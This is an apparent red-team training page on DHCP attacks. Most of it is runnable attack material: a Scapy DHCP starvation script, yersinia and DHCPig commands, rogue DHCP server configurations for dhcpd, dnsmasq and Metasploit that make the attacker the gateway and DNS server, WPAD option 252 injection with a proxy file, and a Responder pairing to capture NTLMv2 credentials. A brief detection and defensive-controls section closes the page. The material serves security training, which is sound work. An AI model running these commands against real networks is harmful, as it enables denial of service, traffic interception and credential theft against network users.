---
layout: training-page
title: "DHCP Attacks — Red Team Academy"
module: "Network Attacks"
tags:
  - dhcp
  - network
  - rogue-server
  - starvation
  - mitm
page_key: "network-dhcp-attacks"
render_with_liquid: false
---

# DHCP Attacks

DHCP has no authentication — any device on a segment can respond to DHCP requests. Two primary attacks: starvation exhausts the IP pool to force clients onto a rogue server, and rogue DHCP directly hands out attacker-controlled configuration including a malicious default gateway, DNS server, and WPAD proxy.

## Attack 1: DHCP Starvation

```bash
# Flood the DHCP server with requests using random source MACs
# Exhausts the IP pool — legitimate clients can't get addresses
# Used as a precursor to rogue DHCP (force clients to use yours)

# Yersinia
yersinia -I  # interactive
# Select DHCP → "sending DISCOVER packet" attack (type 1)

# CLI mode
yersinia dhcp -attack 1 -interface eth0

# DHCPig — starvation tool
# github.com/kamorin/DHCPig
python3 dhcpig.py eth0

# Scapy manual starvation
python3 << 'EOF'
from scapy.all import *
import random

def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0,255)) for _ in range(6)])

def dhcp_discover(mac):
    return (Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=bytes.fromhex(mac.replace(':',''))) /
            DHCP(options=[('message-type','discover'), 'end']))

for _ in range(500):
    sendp(dhcp_discover(random_mac()), iface='eth0', verbose=0)
    
EOF
```

## Attack 2: Rogue DHCP Server

```bash
# After starvation (or if running in parallel), serve DHCP from attacker
# Clients get attacker's gateway/DNS → full MITM without ARP spoofing

# Option 1: dhcpd (ISC DHCP server)
# /etc/dhcp/dhcpd.conf:
cat > /tmp/rogue-dhcpd.conf << 'EOF'
subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.200 192.168.1.250;
  option routers 192.168.1.99;          # attacker IP as gateway
  option domain-name-servers 192.168.1.99;  # attacker IP as DNS
  option domain-name "corp.local";
  # WPAD — forces browser proxy auth (pairs with Responder)
  option wpad-url "http://wpad.corp.local/wpad.dat";
  # option 252 = WPAD proxy auto-discovery URL
  option 252 "http://192.168.1.99/wpad.dat\n";
  default-lease-time 300;
  max-lease-time 600;
}
EOF

dhcpd -cf /tmp/rogue-dhcpd.conf -pf /tmp/dhcpd.pid eth0

# Enable IP forwarding so traffic still reaches real gateway
echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables NAT — forward intercepted traffic to real gateway
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE


# Option 2: dnsmasq (simpler setup)
dnsmasq --no-daemon \
  --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,300s \
  --dhcp-option=3,192.168.1.99 \
  --dhcp-option=6,192.168.1.99 \
  --dhcp-option=252,"http://192.168.1.99/wpad.dat" \
  --address=/#/192.168.1.99  # resolve all DNS to attacker


# Option 3: Metasploit rogue DHCP module
use auxiliary/server/dhcp
set SRVHOST 0.0.0.0
set NETMASK 255.255.255.0
set ROUTER 192.168.1.99
set DNSSERVER 192.168.1.99
set DOMAIN corp.local
run
```

## Attack 3: DHCP Option 252 — WPAD Injection

```bash
# Even without starvation, respond faster than the real DHCP server
# for targeted hosts using unicast DHCP responses

# DHCP option 252 tells Windows where to find the WPAD proxy config
# Windows automatically fetches wpad.dat and uses the proxy
# This forces NTLM auth → pairs perfectly with Responder

# Verify WPAD is being fetched after rogue DHCP
tcpdump -i eth0 'tcp port 80 and host 192.168.1.99'
# Should see GET /wpad.dat requests

# Serve wpad.dat to force NTLM authentication
cat > /var/www/html/wpad.dat << 'EOF'
function FindProxyForURL(url, host) {
    return "PROXY 192.168.1.99:8080";
}
EOF
```

## Rogue DHCP + Responder Combo

```bash
# Maximum effectiveness: rogue DHCP + Responder working together

# Terminal 1: Rogue DHCP (hands out attacker as DNS + WPAD)
dnsmasq --no-daemon --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,300s \
  --dhcp-option=3,192.168.1.99 \
  --dhcp-option=6,192.168.1.99 \
  --dhcp-option=252,"http://wpad/wpad.dat"

# Terminal 2: Responder answers WPAD DNS + serves fake auth
responder -I eth0 -w -F

# Clients that renew DHCP get:
# - Attacker as gateway → traffic sniffable
# - Attacker as DNS → all names resolve to attacker
# - WPAD URL → browsers auth to attacker → NTLMv2 captured
```

## Detection

```
Rogue DHCP indicators:
  - Unexpected DHCP server IP in offer packets
  - Short lease times from unknown server
  - Default gateway in different subnet from expected
  - Multiple DHCP servers responding (race condition visible in Wireshark)
  
Defensive controls:
  - DHCP snooping on managed switches (trusted ports only)
  - Dynamic ARP Inspection (DAI)
  - IP Source Guard
```

## Resources

- Yersinia — `github.com/tomac/yersinia`
- DHCPig — `github.com/kamorin/DHCPig`
- MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
- Responder WPAD — `/network-attacks/responder/`
